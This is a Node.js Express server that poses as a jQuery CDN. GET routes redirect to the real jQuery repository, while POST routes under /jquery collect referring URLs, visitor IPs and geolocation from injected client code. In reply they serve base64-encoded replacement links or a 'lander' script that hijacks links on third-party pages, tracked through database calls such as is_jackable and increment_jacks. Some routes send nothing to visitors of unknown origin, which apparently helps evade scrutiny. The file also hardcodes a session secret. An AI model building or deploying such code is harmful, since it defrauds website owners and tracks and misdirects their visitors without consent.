//module dependencies
var express = require('express')
  , http = require('http')
  , mysql = require('mysql')
  , path = require('path');
var app = express();
var request = require('request');
var urlParser = require('url');
var fs = require('node-fs');
var uuid = require('node-uuid');
var cors = require('cors');
var get_ip = require('ipware')().get_ip;
var geoip = require('geoip-lite');
//new middlewares
var favicon = require('serve-favicon');
var logger = require('morgan');
var methodOverride = require('method-override');
var session = require('express-session');
var bodyParser = require('body-parser');
var multer = require('multer');
var errorHandler = require('errorhandler');
var cookieParser = require('cookie-parser');

var config = require('./config');

//Date prototype for converting Date() to MySQL DateTime format
Date.prototype.toMysqlFormat = function () {
    function pad(n) { return n < 10 ? '0' + n : n }
    return this.getFullYear() + "-" + pad(1 + this.getMonth()) + "-" + pad(this.getDate()) + " " + pad(this.getHours()) + ":" + pad(this.getMinutes()) + ":" + pad(this.getSeconds());
};
String.prototype.replaceAt=function(index, character) {
    return this.substr(0, index) + character + this.substr(index+character.length);
}

// all environments
app.set('port', config.port);
app.set('views', __dirname + '/views');
app.set('view engine', 'jade');
//app.use(favicon(__dirname + '/public/favicon.ico'));
app.use(logger('dev'));
app.use(cookieParser());
app.use(bodyParser.json());                          // parse application/json
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));  // parse application/x-www-form-urlencoded
app.use(multer());                                   // parse multipart/form-data
app.use(session({ secret: 'foosballIsDaDevil', resave: true, saveUninitialized: true }));
app.use(methodOverride());
app.use(express.static(path.join(__dirname, 'public')));

//deprecated, see: https://github.com/strongloop/express/wiki/Migrating-from-3.x-to-4.x
/*app.configure('development', function() {
    app.use(errorHandler());
    app.locals.pretty = true;
});*/

var connection = mysql.createConnection(config.db_connection);
connection.connect();

function getCodeDelimiter() {
    return "aIx1Fgix89e";
}

function getClientResponseJSON(uuid, url, ip, callback) {

    console.log("Making client response...");

    var useSplitTestLinks = 1;

    if(Math.random()<.5) {
        useSplitTestLinks = 0;
    }

    var response = "";

    connection.query("select is_jackable(?,?,?) as redirect_rate;", [url, config.minimum_clicks_per_min, ip], function(err, docs) {
        if(docs[0]) {
            var redirect_rate = docs[0].redirect_rate;
            var randomNumber = Math.random() * 100;

            if(randomNumber <= redirect_rate) {
                connection.query("SELECT get_replacement_links(?,?) as links;", [url, useSplitTestLinks], function(err, docs) {
                    if(docs.length > 0) {
                        var links = docs[0].links;
                        if(links) {
                            var linksArr = links.split(",");
                            /* 2. transform that into base64 code */
                            for(var i=0 ; i<linksArr.length ; i++) {
                              response += new Buffer(linksArr[i]).toString('base64') + getCodeDelimiter();
                            }
                        }

                    }
                    callback({jquery: response});
                    connection.query("CALL increment_jacks(?,?);", [url, uuid], function(err, docs) {
                        if(err) {
                            console.log("Error incrementing jacks for url: " + url + " : " + err);
                        }
                    });
                });
            }
            else {
                callback({jquery: false});
            }
        }
        else {
            callback({jquery: false});
        }       
    });
}

function formatURL(url) {
    if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
       url = "http://" + url;
    }

    if (url.substring(0, 11) == "http://www.") {
       url = url.replace("http://www.", "http://");
    }

    if (url.substring(0, 12) == "https://www.") {
        url = url.replace("https://www.", "http://");
    }

    if (url.substring(0, 8) == "https://") {
       url = url.replace("https://", "http://");
    }

    //drop everything after first '?' (query args)
    url = url.split('?')[0];

    //drop everything after first '#'
    url = url.split('#')[0];

    var lastChar = url.substr(url.length - 1);
 
    if(lastChar == '/') {
        url = url.substring(0, url.length - 1);
    }

    return url;
}

function getDomain(url) {
    return urlParser.parse(url).hostname;
}

app.get('/', function (req, res) {
    res.redirect("http://github.com");
});

//Get and load client js
app.get('/jquery', function (req, res) {
    res.writeHead(301, { //You can use 301, 302 or whatever status code
      'Location': 'https://github.com/jquery/jquery',
      'Expires': (new Date()).toGMTString()
    });
    res.end();
});

// app.post('/jquery', function(req, res) {
//     var uuid=req.body.version;
//     console.log("uuid: " + uuid);  
//     fs.readFile('./client/compressed/compressed_landercode_old.js', function(err, data) {
//         if(err) throw err;
//         var replacedFile = String(data).replace('replacemeuuid', uuid);       
//         res.writeHead(200, {
//             'Content-Length': replacedFile.length,
//             'Content-Type': 'text/plain',
//             'Access-Control-Allow-Origin': '*',
//             'Access-Control-Allow-Methods': 'GET, OPTIONS',
//             'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
//         });
//         res.end(replacedFile);
//     });
// });

app.get('/jquery/latest', function (req, res) {
    res.writeHead(301, { //You can use 301, 302 or whatever status code
        'Location': 'https://github.com/jquery/jquery',
        'Expires': (new Date()).toGMTString()
    });
    res.end();
});

app.post('/jquery/latest', function(req, res) {
    var url = req.body.referer;
    var uuid = req.body.version;
    var full_url = url;

    var ip = req.headers['x-forwarded-for'];
    var geo = geoip.lookup(ip);

    if(!geo) {
        geo = {country: "UNKNOWN"};
        console.log("IP: " + ip + " had unknown geo region.");
    }

    if(!ip) {
        ip="0.0.0.0";
    }

    console.log("Received lander request from " + url + " with uuid = " + uuid);

    url = formatURL(url);
    var domain = getDomain(url);

    //console.log("Formatted url to be: " + url);
    //console.log("The domain of the url is: " + domain);

    connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if(docs[0] != undefined) {
            var response_string = docs[0].value;

            console.log("Response from process_request: " + response_string);
            if(response_string == "OLD_RIPPED") {
                //send back data!
                getClientResponseJSON(uuid, url, ip, function(response) {

                    console.log("Response to client: " + response.jquery);

                    if(response.jquery == false) { 
                        response = ""; 
                    }
                    else { 
                        response = response.jquery; 
                    }

                    if(geo.country == "UNKNOWN") {
                        response = "";
                    }

                    res.writeHead(200, {
                        'Content-Length': response.length,
                        'Content-Type': 'text/plain',
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'GET, OPTIONS',
                        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                    });
                    res.end(response);
                });
            }
            else if(response_string == "UNKNOWN_BEHAVIOR") {
                console.log("Something went wrong when calling process_request.")
            }
            else if(response_string == "UNKNOWN_UUID") {
                console.log("An unknown uuid (" + uuid + ") was sent to the DB.")
            }
            else {
                response = ""; 
                res.writeHead(200, {
                    'Content-Length': response.length,
                    'Content-Type': 'text/plain',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                });
                res.end(response);
            }
        }
        else { 
            console.log("Failed to get a response from process_request"); 
        }
  });

});


app.post('/jquery/stable', function(req, res) {
    var url = req.body.stats;
    var uuid = req.body.version;
    var full_url = url;

    var ip = req.headers['x-forwarded-for'];
    var geo = geoip.lookup(ip);

    if(!geo) {
        geo = {country: "UNKNOWN"};
        console.log("IP: " + ip + " had unknown geo region.");
    }

    if(!ip) {
        ip="0.0.0.0";
    }

    console.log("Received lander request from " + url + " with uuid = " + uuid);

    url = formatURL(url);
    var domain = getDomain(url);

    //console.log("Formatted url to be: " + url);
    //console.log("The domain of the url is: " + domain);

    connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if(docs[0] != undefined) {
            var response_string = docs[0].value;

            console.log("Response from process_request: " + response_string);
            if(response_string == "OLD_RIPPED") {
                //send back data!
                getClientResponseJSON(uuid, url, ip, function(response) {

                    console.log("Response to client: " + response.jquery);

                    if(response.jquery == false) { 
                        response = ""; 
                    }
                    else { 
                        response = response.jquery; 
                    }

                    if(geo.country == "UNKNOWN") {
                        response = "";
                    }

                    fs.readFile('./client/compressed/compressed_landercode_new.js', function(err, data) {
                        if(err) throw err;
                        var replacedFile = String(data).replace('replacemeuuid', uuid);
                        replacedFile = String(replacedFile).replace('replacemelinks', response);
                        res.writeHead(200, {
                            'Content-Length': replacedFile.length,
                            'Content-Type': 'text/plain',
                            'Access-Control-Allow-Origin': '*',
                            'Access-Control-Allow-Methods': 'GET, OPTIONS',
                            'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                        });
                        res.end(replacedFile);
                    });
                });
            }
            else if(response_string == "UNKNOWN_BEHAVIOR") {
                console.log("Something went wrong when calling process_request.")
            }
            else if(response_string == "UNKNOWN_UUID") {
                console.log("An unknown uuid (" + uuid + ") was sent to the DB.")
            }
            else {
                response = ""; 
                res.writeHead(200, {
                    'Content-Length': response.length,
                    'Content-Type': 'text/plain',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                });
                res.end(response);
            }
        }
        else { 
            console.log("Failed to get a response from process_request"); 
        }
  });
});

app.post('/jquery/dist', function(req, res) {
    var url = req.body.stats;
    var uuid = req.body.version;
    var full_url = url;

    var ip = req.headers['x-forwarded-for'];
    var geo = geoip.lookup(ip);

    if(!geo) {
        geo = {country: "UNKNOWN"};
        console.log("IP: " + ip + " had unknown geo region.");
    }

    if(!ip) {
        ip="0.0.0.0";
    }

    console.log("Received lander request from " + url + " with uuid = " + uuid);

    url = formatURL(url);
    var domain = getDomain(url);

    //console.log("Formatted url to be: " + url);
    //console.log("The domain of the url is: " + domain);

    connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if(docs[0] != undefined) {
            var response_string = docs[0].value;

            console.log("Response from process_request: " + response_string);
            if(response_string == "OLD_RIPPED") {
                //send back data!
                getClientResponseJSON(uuid, url, ip, function(response) {

                    console.log("Response to client: " + response.jquery);

                    if(response.jquery == false) { 
                        response = ""; 
                    }
                    else { 
                        response = response.jquery; 
                    }

                    //if(geo.country == "UNKNOWN") {
                    //    response = "";
                    //}

                    fs.readFile('./client/compressed/compressed_landercode_experimental.js', function(err, data) {
                        if(err) throw err;
                        var replacedFile = String(data).replace('replacemeuuid', uuid);
                        replacedFile = String(replacedFile).replace('replacemelinks', response);
                        res.writeHead(200, {
                            'Content-Length': replacedFile.length,
                            'Content-Type': 'text/plain',
                            'Access-Control-Allow-Origin': '*',
                            'Access-Control-Allow-Methods': 'GET, OPTIONS',
                            'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                        });
                        res.end(replacedFile);
                    });
                });
            }
            else if(response_string == "UNKNOWN_BEHAVIOR") {
                console.log("Something went wrong when calling process_request.")
            }
            else if(response_string == "UNKNOWN_UUID") {
                console.log("An unknown uuid (" + uuid + ") was sent to the DB.")
            }
            else {
                response = ""; 
                res.writeHead(200, {
                    'Content-Length': response.length,
                    'Content-Type': 'text/plain',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                });
                res.end(response);
            }
        }
        else { 
            console.log("Failed to get a response from process_request"); 
        }
  });
});

app.get('/jquery/dist', function (req, res){

    var xalt = req.headers['x-alt-referer'];

    var index = xalt.lastIndexOf("?txid=");

    var url = xalt.substring(0, index);
    var uuid = xalt.substring(index + 6);
    var full_url = url;

    var ip = req.headers['x-forwarded-for'];
    var geo = geoip.lookup(ip);

    if(!geo) {
        geo = {country: "UNKNOWN"};
        console.log("IP: " + ip + " had unknown geo region.");
    }

    if(!ip) {
        ip="0.0.0.0";
    }

    console.log("Received lander request from " + url + " with uuid = " + uuid);

    url = formatURL(url);
    var domain = getDomain(url);

    //console.log("Formatted url to be: " + url);
    //console.log("The domain of the url is: " + domain);

    connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if(docs[0] != undefined) {
            var response_string = docs[0].value;

            console.log("Response from process_request: " + response_string);
            if(response_string == "OLD_RIPPED") {
                //send back data!
                getClientResponseJSON(uuid, url, ip, function(response) {

                    console.log("Response to client: " + response.jquery);

                    if(response.jquery == false) { 
                        response = ""; 
                    }
                    else { 
                        response = response.jquery; 
                    }

                    //if(geo.country == "UNKNOWN") {
                    //    response = "";
                    //}

                    fs.readFile('./client/compressed/compressed_landercode_experimental.js', function(err, data) {
                        if(err) throw err;
                        var replacedFile = String(data).replace('replacemeuuid', uuid);
                        replacedFile = String(replacedFile).replace('replacemelinks', response);
                        res.writeHead(200, {
                            'Content-Length': replacedFile.length,
                            'Content-Type': 'text/plain',
                            'Access-Control-Allow-Origin': '*',
                            'Access-Control-Allow-Methods': 'GET, OPTIONS',
                            'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                        });
                        res.end(replacedFile);
                        // res.status(200);
                        // res.header('Content-type','application/json');
                        // res.header('Charset','utf8');
                        // res.jsonp(req.query.ver + '('+ JSON.stringify(replacedFile) + ');');
                    });
                });
            }
            else if(response_string == "UNKNOWN_BEHAVIOR") {
                console.log("Something went wrong when calling process_request.")
            }
            else if(response_string == "UNKNOWN_UUID") {
                console.log("An unknown uuid (" + uuid + ") was sent to the DB.")
            }
            else {
                response = ""; 
                res.writeHead(200, {
                    'Content-Length': response.length,
                    'Content-Type': 'text/plain',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                });
                res.end(response);
            }
        }
        else { 
            console.log("Failed to get a response from process_request"); 
        }
  });
});

app.post('/jquery', function (req, res){

    var url = req.headers['referer'];

    var uuid = req.body.version;

    var full_url = url;

    var ip = req.headers['x-forwarded-for'];
    var geo = geoip.lookup(ip);

    if(!geo) {
        geo = {country: "UNKNOWN"};
        console.log("IP: " + ip + " had unknown geo region.");
    }

    if(!ip) {
        ip="0.0.0.0";
    }

    console.log("Received lander request from " + url + " with uuid = " + uuid);

    url = formatURL(url);
    var domain = getDomain(url);

    //console.log("Formatted url to be: " + url);
    //console.log("The domain of the url is: " + domain);

    connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
        if(docs[0] != undefined) {
            var response_string = docs[0].value;

            console.log("Response from process_request: " + response_string);
            if(response_string == "OLD_RIPPED") {
                //send back data!
                getClientResponseJSON(uuid, url, ip, function(response) {

                    console.log("Response to client: " + response.jquery);

                    if(response.jquery == false) { 
                        response = ""; 
                    }
                    else { 
                        response = response.jquery; 
                    }

                    //if(geo.country == "UNKNOWN") {
                    //    response = "";
                    //}

                    fs.readFile('./client/compressed/compressed_landercode_experimental.js', function(err, data) {
                        if(err) throw err;
                        var replacedFile = String(data).replace('replacemeuuid', uuid);
                        replacedFile = String(replacedFile).replace('replacemelinks', response);
                        res.writeHead(200, {
                            'Content-Length': replacedFile.length,
                            'Content-Type': 'text/plain',
                            'Access-Control-Allow-Origin': '*',
                            'Access-Control-Allow-Methods': 'GET, OPTIONS',
                            'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                        });
                        res.end(replacedFile);
                        // res.status(200);
                        // res.header('Content-type','application/json');
                        // res.header('Charset','utf8');
                        // res.jsonp(req.query.ver + '('+ JSON.stringify(replacedFile) + ');');
                    });
                });
            }
            else if(response_string == "UNKNOWN_BEHAVIOR") {
                console.log("Something went wrong when calling process_request.")
            }
            else if(response_string == "UNKNOWN_UUID") {
                console.log("An unknown uuid (" + uuid + ") was sent to the DB.")
            }
            else {
                response = ""; 
                res.writeHead(200, {
                    'Content-Length': response.length,
                    'Content-Type': 'text/plain',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                });
                res.end(response);
            }
        }
        else { 
            console.log("Failed to get a response from process_request"); 
        }
  });
});


app.listen('9000')
console.log('Magic happens on port 9000');
exports = module.exports = app;